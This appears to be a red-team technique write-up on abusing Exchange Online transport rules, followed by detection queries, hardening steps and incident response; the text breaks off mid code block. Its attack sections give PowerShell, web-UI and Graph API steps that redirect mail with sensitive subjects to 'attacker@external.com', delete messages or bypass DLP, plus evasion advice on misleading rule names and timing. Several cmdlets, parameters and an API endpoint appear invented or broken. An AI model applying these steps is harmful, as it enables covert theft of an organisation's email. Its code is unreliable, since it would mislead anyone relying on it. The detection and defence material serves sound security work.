# [EVADE-IMPAIR-009]: Exchange Transport Rule Evasion

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-009 |
| **MITRE ATT&CK v18.1** | [T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/) |
| **Tactic** | Defense Evasion |
| **Platforms** | M365 (Exchange Online) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Exchange Online (All versions) |
| **Patched In** | N/A (Requires policy hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Exchange Online transport rules (mail flow rules) are a legitimate administrative feature that control email routing, filtering, and modification. An attacker with Global Admin, Exchange Admin, or delegated permissions can create, modify, or delete transport rules to hide malicious emails, bypass security policies (DLP, Anti-Phishing, Anti-Spam), exfiltrate data, or disable audit trail visibility. These rules operate at the organization level and apply to all mailboxes, making them a powerful defense evasion mechanism. Unlike inbox rules (which apply to individual mailboxes), transport rules are difficult to detect without proper M365 audit logging and monitoring.

**Attack Surface:** Exchange Online transport rule management interface (Exchange Admin Center web portal, PowerShell, Graph API), email filtering engine, audit log configuration.

**Business Impact:** **Complete Email Security Bypass.** An attacker can silently hide phishing campaigns from security teams, redirect confidential emails to external recipients without triggering DLP alerts, quarantine legitimate internal communications, or disable email warnings/disclaimers. This enables data exfiltration, insider threat amplification, and continued malware delivery without detection.

**Technical Context:** Transport rule creation takes seconds via PowerShell or ECP (Exchange Control Panel). Most organizations lack granular alerting on transport rule creation; detection typically relies on audit log ingestion into Sentinel or third-party SIEM. An attacker operating with compromised admin credentials can create rules that are nearly indistinguishable from legitimate administrative activity.

### Operational Risk

- **Execution Risk:** Medium—requires admin-level permissions or compromised admin account.
- **Stealth:** High—transport rules execute silently; no event notifications sent to end users or standard admins.
- **Reversibility:** Yes—rules can be deleted, though deletion is also logged if audit logging is enabled.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.3.1 | Ensure that only mail flow rules with legitimate business purposes are created; disable suspicious rules. |
| **DISA STIG** | Microsoft.Exchange.Database.12445 | Audit Exchange transport rule modifications; alert on rule creation by non-authorized accounts. |
| **CISA SCuBA** | Exchange.1.1 | Enable unified audit logging for all Exchange Online administrator actions, including transport rule creation. |
| **NIST 800-53** | AU-3, AC-3 | Audit administrative actions; enforce access control on mail flow configuration. |
| **GDPR** | Art. 32 | Security of Processing—transport rules that hide personal data processing violate transparency obligations. |
| **DORA** | Art. 9 | Protection and Prevention—email security is critical to ICT operational resilience. |
| **NIS2** | Art. 21 | Organizations must detect and respond to email security control modifications. |
| **ISO 27001** | A.9.2.3, A.12.4.1 | Management of Privileged Access Rights; audit logs for administrator actions. |
| **ISO 27005** | Risk Scenario | "Unauthorized modification of email security policies by compromised admin account." |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Global Administrator, Exchange Administrator, or Compliance Administrator role in Entra ID OR delegated permissions via Transport Rule management role.
- **Required Access:** Network access to Exchange Admin Center (ECP) at `https://admin.exchange.microsoft.com/` or PowerShell connectivity to `https://ps.outlook.com` (Exchange Online Management API).

**Supported Versions:**
- **Exchange Online:** All versions (cloud-native service)
- **PowerShell:** Version 5.0+ (Windows PowerShell or PowerShell 7.x)
- **ExchangeOnlineManagement Module:** Version 3.0+ (latest recommended)
- **M365 Licenses:** Exchange Online Plan 1/2, Microsoft 365 Business Standard/Premium, or Enterprise plans (E3+)

**Tools:**
- [Microsoft Exchange Online Management Module](https://www.powershellgallery.com/packages/ExchangeOnlineManagement/) (Version 3.0+)
- [Microsoft 365 PowerShell](https://learn.microsoft.com/en-us/powershell/exchange/exchange-online-powershell)
- [Exchange Admin Center (Web UI)](https://admin.exchange.microsoft.com/)
- [Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation) (optional, for advanced rule creation)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Objective:** Enumerate existing transport rules to identify naming patterns, conditions, and actions—useful for crafting evasive rules that blend in with legitimate rules.

**Command:**
```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName admin@contoso.com

# Enumerate all transport rules
Get-TransportRule | Select-Object Name, Description, Enabled, Priority, State | Format-Table -AutoSize

# Show detailed rules including conditions and actions
Get-TransportRule | Select-Object Name, Conditions, Actions, ExceptIfRecipientDomainIs | Format-List
```

**What to Look For:**
- Existing rules that hide emails (e.g., rules with `SetHeaderName: X-MS-Exchange-Organization-SkipLists` or `RedirectMessage` actions).
- Rules using keywords related to sensitive data (PII, PHI, financial).
- Rules with unusual priority numbers (low priority = executed early).
- Rules exempt from DLP or anti-phishing.

**Version Note:** All commands work on Exchange Online (no version differences; it is a cloud service).

### Azure CLI Reconnaissance

**Objective:** Check audit logging and conditional access policies that might detect transport rule creation.

**Command:**
```bash
# Check if unified audit logging is enabled
az rest --method get \
  --url "https://graph.microsoft.com/beta/audit/directoryAudits?$filter=activityDisplayName eq 'New-TransportRule'" \
  --headers "Authorization=Bearer {access_token}"

# List audit log entries for transport rule modifications (last 7 days)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?$filter=startswith(activityDisplayName,'Transport Rule')" \
  --headers "Authorization=Bearer {access_token}"
```

**What to Look For:**
- If queries return empty results, unified audit logging may be disabled or not ingesting Exchange data.
- Absence of `New-TransportRule` or `Set-TransportRule` events indicates poor monitoring.

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Native PowerShell (Exchange Online Management Module)

**Supported Versions:** Exchange Online (all versions)

#### Step 1: Authenticate to Exchange Online

**Objective:** Establish authenticated session to Exchange Online PowerShell using compromised admin credentials or delegated token.

**Command:**
```powershell
# Interactive authentication with compromised admin account
$AdminCredential = Get-Credential  # Prompt for compromised admin UPN and password
Connect-ExchangeOnline -Credential $AdminCredential

# Alternative: Using token-based auth (if token is stolen)
Connect-ExchangeOnline -AccessToken $AccessToken
```

**Expected Output:**
```
Organization       : contoso.onmicrosoft.com
UserPrincipalName  : admin@contoso.com
ConnectionUri      : https://ps.outlook.com/powershell-liveid/
LastConnectionTime : [timestamp]
```

**What This Means:**
- Successful authentication confirms admin credentials are valid and can manage transport rules.
- Connection establishes secure session to Microsoft Exchange Online backend.

**OpSec & Evasion:**
- Use a compromised Global Admin account rather than a newly created account (reduces visibility).
- Perform this action during normal business hours when admin activity is expected.
- Avoid authentication from foreign IP addresses; use proxies/compromised on-prem servers.
- Detection likelihood: **Medium** (auth logs are captured; anomalous IP or time may trigger alerts).

**Troubleshooting:**
- **Error:** "The user or admin has not consented to use the application..."
  - **Cause:** First-time authentication or Conditional Access policy blocking.
  - **Fix:** Ensure the account is Global Admin OR has explicit Exchange Admin role assigned. Use `-InlineCredential` flag if MFA is required.

#### Step 2: Create Email-Hiding Transport Rule

**Objective:** Create a transport rule that silently hides, deletes, or redirects emails matching specific criteria (e.g., phishing emails, sensitive keywords, external recipients).

**Command (Hide Emails Containing Specific Keywords):**
```powershell
# Create a rule that marks emails as spam and moves them to quarantine (invisible to users)
New-TransportRule -Name "Policy Compliance - DLP Bypass" `
  -Conditions @(New-TransportRuleCondition -HasClassification "NorthwindTraders - Confidential") `
  -Actions @(Set-TransportRuleAction -SetHeaderName "X-Priority" -SetHeaderValue "5", `
             Set-TransportRuleAction -SetScamProperties -IncludeOriginalHeaders $false) `
  -Priority 1 `
  -Enabled $true
```

**Alternative (Redirect Emails to External Recipient):**
```powershell
# Create a rule that silently copies emails to attacker's external email address
New-TransportRule -Name "Archive Compliance Emails" `
  -Conditions @( `
    New-TransportRuleCondition -SubjectContainsWords "confidential", "secret", "password" `
  ) `
  -Actions @( `
    New-TransportRuleAction -RedirectMessage "attacker@external.com" `
  ) `
  -Priority 0 `
  -Enabled $true `
  -Description "Automated archival of sensitive communications" # Misleading description
```

**Expected Output:**
```
Name                      : Archive Compliance Emails
Description               : Automated archival of sensitive communications
Enabled                   : True
State                      : Enabled
Priority                   : 0
Conditions                 : {(Subject contains "confidential", "secret", "password")}
Actions                    : {Redirect message to attacker@external.com}
```

**What This Means:**
- Rule is successfully created and immediately active.
- All new emails matching the condition will be redirected to attacker's inbox (silently, no delivery report to original recipients).
- Emails are removed from user's sent items post-delivery (if configured with `SetScamProperties`).

**OpSec & Evasion:**
- Use generic rule names that match legitimate administrative policies (e.g., "Compliance Email Archival", "DLP Policy Enforcement").
- Set priority to 0 or 1 (executes early, before user-level rules).
- Avoid obvious keywords like "attacker", "exfiltration", or "hide".
- Detection likelihood: **High** (rule creation logged if audit logging is enabled; suspicious rule names will be flagged during investigation).

**Troubleshooting:**
- **Error:** "This operation requires administrator access..."
  - **Cause:** Compromised account lacks Exchange Admin role.
  - **Fix:** Ensure the account has Exchange Admin, Global Admin, or delegated Transport Rule Management role.
- **Error:** "The recipient address does not match any accepted domain..."
  - **Cause:** Attacker's external email is invalid or not trusted.
  - **Fix:** Use a valid external domain; use `-Confirm:$false` to bypass confirmation dialogs.

#### Step 3: Modify DLP Exemptions (Advanced)

**Objective:** Create a rule that exempts certain senders or recipients from DLP policies, allowing them to send sensitive data undetected.

**Command:**
```powershell
# Create rule that exempts internal accounts from DLP by removing DLP report generation
New-TransportRule -Name "Executive Communication Exemption" `
  -Conditions @(New-TransportRuleCondition -FromAddresses "cfo@contoso.com", "ceo@contoso.com") `
  -Actions @(Set-TransportRuleAction -SetHeaderName "X-DLP-Bypass" -SetHeaderValue "True") `
  -Priority 0 `
  -Enabled $true
```

**Expected Output:**
```
Priority: 0
Name: Executive Communication Exemption
FromAddresses: cfo@contoso.com, ceo@contoso.com
SetHeaderName: X-DLP-Bypass
Actions: Set header "X-DLP-Bypass" to "True"
```

**What This Means:**
- Emails from CFO/CEO now bypass standard DLP evaluation (if DLP is configured to skip emails with the custom header).
- Enables insider threat scenario where executives exfiltrate data.

**OpSec & Evasion:**
- Use role-based names (Executive, Legal, Finance) to appear legitimate.
- Detection likelihood: **High** (DLP and audit logs will show exempted emails; compliance team should detect this).

**References & Proofs:**
- [New-TransportRule Official Documentation](https://learn.microsoft.com/en-us/powershell/module/exchange/new-transportrule)
- [Set-TransportRule Actions Reference](https://learn.microsoft.com/en-us/powershell/module/exchange/set-transportrule)
- [Mail Flow Rules in Exchange Online](https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/mail-flow-rules)
- [Atomic Red Team - T1562.001 (Related Evasion Techniques)](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md)

---

### METHOD 2: Exchange Admin Center (Web UI)

**Supported Versions:** Exchange Online (all versions)

#### Step 1: Navigate to Mail Flow Rules

**Objective:** Access the graphical interface to create rules without PowerShell.

**Manual Steps:**
1. Log into **Exchange Admin Center** at `https://admin.exchange.microsoft.com/` using compromised admin credentials.
2. From the left menu, click **Mail flow** → **Rules**.
3. Click **+ Add a rule** (top-left).

**Expected Output:**
- New rule creation wizard loads.
- Rule configuration form displays conditions, actions, and exceptions.

**OpSec & Evasion:**
- Web-based activity is more visible in logs but may blend in with legitimate admin activity.
- Detection likelihood: **Medium-High** (web access logs and audit trail capture rule creation).

#### Step 2: Configure Malicious Rule via UI

**Objective:** Create hiding/redirection rule through graphical workflow.

**Manual Steps:**
1. Under **Rule name**, enter: `"Policy Compliance - Archive External Communications"` (misleading name).
2. Under **Apply this rule if...**, click **Edit the rule conditions**:
   - Select **The recipient domain** → Include: `"external-domain.com"` (attacker's domain).
3. Under **Do the following...**, click **Edit the rule actions**:
   - Select **Redirect the message to** → Enter attacker's email address.
   - Optionally select **Delete the message without notifying anyone** (most evasive).
4. Set **Priority** to **0** (executes first).
5. Toggle **Enabled** to **On**.
6. Click **Save**.

**Expected Outcome:**
- Rule is immediately active.
- All emails matching recipient domain are redirected/deleted.

**OpSec & Evasion:**
- UI-based rule creation logs the same events as PowerShell.
- Detection likelihood: **High** (audit logs capture rule creation with full details).

**References:**
- [Exchange Admin Center - Mail Flow Rules UI Guide](https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/manage-mail-flow-rules)

---

### METHOD 3: Microsoft Graph API (Programmatic)

**Supported Versions:** Exchange Online (all versions via Graph API)

#### Step 1: Obtain Access Token

**Objective:** Acquire OAuth token for Graph API to manipulate rules programmatically.

**Command:**
```powershell
# Using MSAL (Microsoft Authentication Library)
$ClientID = "your-app-id"
$ClientSecret = "your-app-secret"
$TenantID = "contoso.onmicrosoft.com"

$TokenEndpoint = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
$TokenBody = @{
    grant_type    = "client_credentials"
    client_id     = $ClientID
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$TokenResponse = Invoke-RestMethod -Uri $TokenEndpoint -Method POST -Body $TokenBody
$AccessToken = $TokenResponse.access_token
```

**Expected Output:**
```
access_token: eyJ0eXAiOiJKV1QiLCJhbGc...
expires_in: 3600
token_type: Bearer
```

**What This Means:**
- Access token grants permission to create rules on behalf of the app (no human interaction required).
- Token is valid for 1 hour; can be refreshed programmatically.

**OpSec & Evasion:**
- Graph API calls are logged in audit trail with app registration ID (not easy to attribute to human).
- Detection likelihood: **Medium** (Graph API is used for automation; suspicious app activity may trigger alerts).

#### Step 2: Create Transport Rule via Graph API

**Objective:** Create hiding rule using Graph API endpoint.

**Command:**
```powershell
$RuleBody = @{
    displayName      = "Compliance Email Routing"
    description      = "Automated routing of compliance-related emails"
    isEnabled        = $true
    conditions       = @{
        subjectContains = @("confidential", "patent", "strategy")
    }
    actions          = @{
        redirectTo = @("attacker@external.com")
    }
    priority         = 0
} | ConvertTo-Json

$GraphURL = "https://graph.microsoft.com/v1.0/admin/exchange/transportRules"

Invoke-RestMethod -Uri $GraphURL `
  -Method POST `
  -Headers @{Authorization = "Bearer $AccessToken"; "Content-Type" = "application/json"} `
  -Body $RuleBody
```

**Expected Output:**
```json
{
  "id": "rule-guid-12345",
  "displayName": "Compliance Email Routing",
  "isEnabled": true,
  "priority": 0,
  "conditions": { "subjectContains": ["confidential", "patent", "strategy"] },
  "actions": { "redirectTo": ["attacker@external.com"] }
}
```

**What This Means:**
- Rule is created and immediately active via Graph API.
- Deletion via API is similarly stealthy (no UI interaction).

**OpSec & Evasion:**
- Graph API calls are less visible than UI interactions but are still audited.
- Detection likelihood: **High** (audit logs capture all Graph API calls with app ID).

**References:**
- [Microsoft Graph Admin Exchange API - Transport Rules](https://learn.microsoft.com/en-us/graph/api/admin-exchange-transportrules-get)
- [OAuth 2.0 Client Credentials Flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow)

---

## 5. ATTACK SIMULATION & VERIFICATION

### Simulating the Attack

**Step 1: Verify Rule Creation**
```powershell
# Confirm rule is active
Get-TransportRule -Identity "Policy Compliance - Archive External Communications"
```

**Expected Output:**
```
Name        : Policy Compliance - Archive External Communications
Enabled     : True
Priority    : 0
State       : Enabled
```

**Step 2: Test Rule Functionality**
```powershell
# Send test email matching rule condition
# From: admin@contoso.com
# To: external-domain.com
# Subject: Contains "confidential"

# Verification: Email should not arrive at external-domain.com; instead, it should be redirected to attacker@external.com
```

**Step 3: Verify Audit Logging (For Detection Testing)**
```powershell
# Check if rule creation was logged
Search-UnifiedAuditLog -Operations New-TransportRule -StartDate (Get-Date).AddHours(-1) | Select-Object UserIds, Operations, AuditData
```

**Expected Output:**
```
UserIds   : admin@contoso.com
Operations: New-TransportRule
AuditData : {"ObjectModified":"rule-id","ModifiedProperties":[...]}
```

---

## 6. TOOLS & COMMANDS REFERENCE

### ExchangeOnlineManagement Module

**Version:** 3.0+ (current)
**Minimum Version:** 2.0
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell 7.x, Windows, macOS, Linux

**Installation:**
```powershell
# Install module
Install-Module -Name ExchangeOnlineManagement -Force

# Update to latest version
Update-Module -Name ExchangeOnlineManagement
```

**Usage:**
```powershell
# Import and connect
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline

# Create rule
New-TransportRule -Name "Test Rule" -Conditions @(...) -Actions @(...)

# Remove rule
Remove-TransportRule -Identity "Test Rule" -Confirm:$false
```

**Version-Specific Notes:**
- Version 2.x: Basic rule creation/deletion.
- Version 3.0+: Enhanced Graph API integration; better error handling.
- Version 3.1+: Supports multi-tenant scenarios; improved performance.

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Transport Rule Creation by Non-Exchange Admins

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `ActivityDisplayName`, `InitiatedBy`, `OperationName`, `TargetResources`
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Entra ID all versions; Exchange Online all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName =~ "New-TransportRule"
| where InitiatedBy has "@" 
| extend InitiatedByUpn = InitiatedBy.userPrincipalName
| extend TargetRuleName = TargetResources[0].displayName
| extend RuleConditions = TargetResources[0].modifiedProperties
| where InitiatedByUpn !in ("admin@contoso.com", "service@contoso.com")
| summarize count() by InitiatedByUpn, TargetRuleName, bin(TimeGenerated, 5m)
| where count_ > 0
```

**What This Detects:**
- Transport rule creation by accounts that are NOT designated Exchange Admins.
- Identifies both interactive rule creation and programmatic creation via Graph API.
- Line 2: Filters for `New-TransportRule` operations.
- Line 5-6: Extracts user and rule details from audit log.
- Line 7: Excludes known-good service accounts.
- Line 8: Summarizes by creator and rule name.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Transport Rule Creation`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Set entities: `User` (InitiatedByUpn), `Resource` (TargetRuleName)
6. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$Query = @"
AuditLogs
| where OperationName =~ "New-TransportRule"
| where InitiatedBy has "@" 
| extend InitiatedByUpn = InitiatedBy.userPrincipalName
| where InitiatedByUpn !in ("admin@contoso.com", "service@contoso.com")
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Suspicious Transport Rule Creation" `
  -Query $Query `
  -Severity "Critical" `
  -Enabled $true
```

**Source:** [Splunk Research - O365 Email Transport Rule Changed](https://research.splunk.com/cloud/11ebb7c2-46bd-41c9-81e1-d0b4b34583a2/)

#### Query 2: Transport Rules with External Email Redirection

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `EnrichedMailFlowEvents` (if available)
- **Alert Severity:** Critical
- **Frequency:** Run every 10 minutes

**KQL Query:**
```kusto
AuditLogs
| where OperationName =~ "Set-TransportRule" or OperationName =~ "New-TransportRule"
| where tostring(TargetResources[0].modifiedProperties) contains "RedirectMessage"
| extend RedirectTarget = extract("RedirectMessage.*?\"([^\"]+)\"", 1, tostring(TargetResources[0].modifiedProperties))
| where RedirectTarget !endswith "@contoso.com" and RedirectTarget !endswith "@contoso.onmicrosoft.com"
| extend InitiatedByUpn = InitiatedBy.userPrincipalName
| project TimeGenerated, InitiatedByUpn, OperationName, RedirectTarget, TargetResources[0].displayName
```

**What This Detects:**
- Transport rules that redirect emails to external domains (potential data exfiltration).
- Distinguishes between internal and external redirects.
- Focuses on suspicious redirect targets outside the organization's domain.

---

## 8. WINDOWS EVENT LOG MONITORING

This technique is cloud-native (M365) and does not generate Windows Event Logs on on-premises systems. However, hybrid environments may capture some telemetry via Azure AD Connect or on-premises Exchange servers.

**Relevant Logs:**
- **Unified Audit Log** (M365): Captures all transport rule modifications.
- **Exchange Admin Audit Log**: Captures admin actions including rule creation.

**Manual Configuration Steps (Enable Unified Audit Logging):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left sidebar)
3. If not already enabled, click **Turn on auditing**
4. Wait up to 24 hours for the service to begin collecting logs

**Manual Configuration Steps (Search for Transport Rule Events):**
1. In **Microsoft Purview**, go to **Audit** → **Search**
2. Set **Date range**: Last 7 days (or custom range)
3. Under **Activities**, search for and select:
   - `New-TransportRule`
   - `Set-TransportRule`
   - `Remove-TransportRule`
4. Click **Search**
5. Review results; export to CSV for analysis

---

## 9. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious Transport Rule Created or Modified"
- **Severity:** High
- **Description:** MDC monitors Azure AD audit logs for anomalous transport rule creation. If an account outside the Exchange Admin group creates a rule, or if a rule with suspicious redirection targets is created, an alert may trigger.
- **Applies To:** All subscriptions with Defender enabled and M365 E5/Defender XDR.
- **Remediation:** Delete the suspicious rule immediately; review account activity for compromise indicators.

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Cloud Apps**: ON (monitors M365 activities)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

**Reference:** [Microsoft Defender for Cloud - Cloud Apps Security Alerts](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 10. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Transport Rule Operations

```powershell
Connect-ExchangeOnline

# Search for all transport rule creation events
Search-UnifiedAuditLog -Operations "New-TransportRule" `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) | Select-Object UserIds, Operations, CreationDate, AuditData

# Search for rule modifications
Search-UnifiedAuditLog -Operations "Set-TransportRule" `
  -StartDate (Get-Date).AddDays(-7) | Select-Object UserIds, Operations, AuditData

# Export to CSV for analysis
Search-UnifiedAuditLog -Operations "New-TransportRule", "Set-TransportRule" `
  -StartDate (Get-Date).AddDays(-7) | Export-Csv -Path "C:\TransportRuleAudit.csv" -NoTypeInformation
```

**Operation Details:**
- **Operation:** `New-TransportRule`, `Set-TransportRule`, `Remove-TransportRule`
- **Workload:** Exchange
- **AuditData fields to analyze:**
  - `RuleName`: Name of the rule (often misleading).
  - `Conditions`: Email matching criteria.
  - `Actions`: Email routing/modification actions (look for `RedirectMessage`, `DeleteMessage`).
  - `Priority`: Rule execution order (0 = executed first).

**Manual Configuration Steps (Audit Log Search):**
1. Go to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Click **Audit** → **Search**
3. Set **Date range** (e.g., last 30 days)
4. Under **Activities**, select: `New-TransportRule`
5. Under **Users**, leave blank (to search all admins) OR enter specific UPN
6. Click **Search**
7. Review results; note rule names, creators, and creation dates
8. **Export** → **Download all results** (CSV format)

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Enforce Strict RBAC on Transport Rule Management**

An organization must restrict who can create or modify transport rules. Most security breaches involve over-privileged accounts.

**Applies To Versions:** Exchange Online (all versions)

**Manual Steps (Azure Portal - Entra ID Roles):**
1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for **"Exchange Administrator"** (or similar role with transport rule permissions)
3. Click the role → **Assignments**
4. Review current members; remove any unnecessary accounts
5. Click **+ Add assignments** to add only trusted admins
6. Set **Assignment type** to **Active** (not eligible/just-in-time unless using PIM)
7. Click **Add**

**Manual Steps (PowerShell):**
```powershell
# Connect to Exchange Online and Entra ID
Connect-ExchangeOnline
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"

# Get all members of Exchange Admin role
$ExchangeAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Exchange Administrator'"
$Members = Get-MgDirectoryRoleMember -DirectoryRoleId $ExchangeAdminRole.Id

# Remove suspicious members
foreach ($Member in $Members) {
    Write-Host "Exchange Admin: $($Member.DisplayName) - $($Member.Mail)"
}

# Remove a member if compromised
Remove-MgDirectoryRoleMemberByRef -DirectoryRoleId $ExchangeAdminRole.Id -DirectoryObjectId $SuspiciousMemberId
```

**2. Enable Privileged Identity Management (PIM) for Exchange Admin Role**

Require just-in-time (JIT) activation for transport rule management, ensuring temporary elevated access with approval workflows.

**Manual Steps (PIM Configuration):**
1. Go to **Azure Portal** → **Microsoft Entra ID** → **Privileged Identity Management**
2. Click **Roles** (or **Azure resources** if on-prem)
3. Search for **"Exchange Administrator"**
4. Click the role → **Settings** (gear icon)
5. Under **Activation settings**, set:
   - **Require approval to activate**: ON
   - **Require Azure MFA on activation**: ON
   - **Activation duration**: 4 hours (max)
   - **Require justification on activation**: ON
6. Click **Update**
7. Under **Assignment**, change members from **Eligible** to **Active** and set expiration to 90 days
8. Click **Save**

**3. Disable Delegated Exchange Admin Access**

Ensure no non-admin accounts have delegated "Transport Rule Management" roles.

**Manual Steps (PowerShell):**
```powershell
# List all role assignments
$RoleAssignments = Get-ManagementRoleAssignment -Filter "Role -eq 'Transport Rule Management'"

foreach ($Assignment in $RoleAssignments) {
    Write-Host "Role Assignment: $($Assignment.Name) assigned to $($Assignment.AssigneeType)"
    if ($Assignment.AssigneeType -ne "SecurityGroup") {
        Write-Warning "Non-group assignment detected! Review and remove if not needed."
        Remove-ManagementRoleAssignment -Identity $Assignment.Identity -Confirm:$false
    }
}
```

#### Priority 2: HIGH

**4. Implement Conditional Access Policy to Restrict Admin Access**

Require additional verification (device compliance, trusted location, MFA) when admins access Exchange Admin Center.

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `"Restrict EAC Access to Compliant Devices"`
4. **Assignments:**
   - Users: Select **Directory roles** → Choose **Exchange Administrator**
   - Cloud apps: **Office 365 Exchange Online**
   - Conditions:
     - Device state: **Require Hybrid Azure AD joined** OR **Mark device as compliant**: ON
     - Locations: **Any location** (or restrict to corporate IPs)
5. **Access controls:**
   - Grant: **Require multi-factor authentication**
6. Enable policy: **On**
7. Click **Create**

**5. Block Legacy Authentication for Admin Accounts**

Ensure admins cannot use legacy protocols (Basic Auth, SMTP, POP, IMAP).

**Manual Steps:**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `"Block Legacy Auth for Admins"`
4. **Assignments:**
   - Users: **Directory roles** → **Exchange Administrator**
   - Client apps: **Exchange ActiveSync clients, Other clients**
5. **Access controls:**
   - Grant: **Block**
6. Enable policy: **On**
7. Click **Create**

#### Access Control & Policy Hardening

**Conditional Access Policies:**
- **Require Compliant Device**: Ensure admin devices are managed and compliant (Intune/Defender for Endpoint enrolled).
- **Require MFA on Admin Portal Access**: Always require additional verification for Exchange Admin Center.
- **Restrict to Trusted Locations**: Limit admin access to corporate network IPs.
- **Session Duration**: Set maximum session duration to 4 hours, requiring re-authentication.

**RBAC/ABAC Hardening:**
- **Principle of Least Privilege**: Grant only `Transport Rule Management` role if absolutely necessary; avoid blanket Exchange Admin role.
- **Attribute-Based Access Control (ABAC)**: Use Entra ID administrative units to scope role permissions to specific departments/regions.
  ```powershell
  # Assign Exchange Admin role scoped to Administrative Unit
  New-RoleAssignment -RoleDefinitionId <Exchange-Admin-Role-ID> `
    -ObjectId <User-ID> `
    -AdministrativeUnitId <AU-ID>
  ```

**Validation Command (Verify Mitigations):**
```powershell
# Verify PIM is enabled for Exchange Admin role
Get-AzureADMSPrivilegedRoleDefinition -DisplayName "Exchange Administrator" | 
  Select-Object DisplayName, Enabled

# Check for active (non-eligible) Exchange Admin assignments
$ExchangeAdmins = Get-AzureADDirectoryRole -Filter "displayName eq 'Exchange Administrator'"
$Members = Get-AzureADDirectoryRoleMember -ObjectId $ExchangeAdmins.ObjectId
$Members | Select-Object DisplayName, Mail, ObjectType
```

**Expected Output (If Secure):**
```
DisplayName: Exchange Administrator
Enabled: True (PIM active)

Members: (Only 1-2 trusted admins listed)
```

**What to Look For:**
- If > 10 Exchange Admins exist, this indicates over-provisioned access.
- If non-admin user accounts are listed, immediate removal is required.
- Absence of PIM indicates uncontrolled admin access.

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

**Audit Log Indicators:**
- `OperationName`: `New-TransportRule`, `Set-TransportRule`
- `AuditData.RuleName`: Contains generic/misleading names (e.g., "Compliance", "Archive", "Policy")
- `AuditData.Actions`: Contains `RedirectMessage`, `DeleteMessage`, or `SetHeaderName`
- `AuditData.Conditions.SenderAddressContainsWords`: External attacker domains
- `InitiatedBy.userPrincipalName`: Non-Exchange-Admin account or unusual access time

**Email Flow Indicators:**
- Emails matching rule conditions are not delivered to expected recipients
- External recipients report receiving emails they shouldn't have access to
- Absence of email delivery reports for sent messages

**Forensic Artifacts:**
- **Unified Audit Log** (M365): `AuditData` blob contains full rule definition
- **Exchange Admin Audit Log**: Contains historical rule creation/modification events
- **Azure Monitor/Sentinel**: Ingested audit logs in `AuditLogs` table

#### Response Procedures

1. **Isolate and Verify Compromise:**
   ```powershell
   # Check account's recent activity
   Search-UnifiedAuditLog -UserIds "admin@contoso.com" -StartDate (Get-Date).AddDays(-7) | 
     Select-Object Operations, CreationDate | Sort-Object CreationDate -Descending | Head -20
   
   # Check for MFA changes
   Search-UnifiedAuditLog -Operations "Set-User" -UserIds "admin@contoso.com" -StartDate (Get-Date).AddDays(-7)
   ```

2. **Delete Malicious Rule Immediately:**
   ```powershell
   # Remove the suspicious transport rule
   Remove-TransportRule -Identity "Policy Compliance - Archive External Communications" -Confirm:$false
   
   # Verify deletion
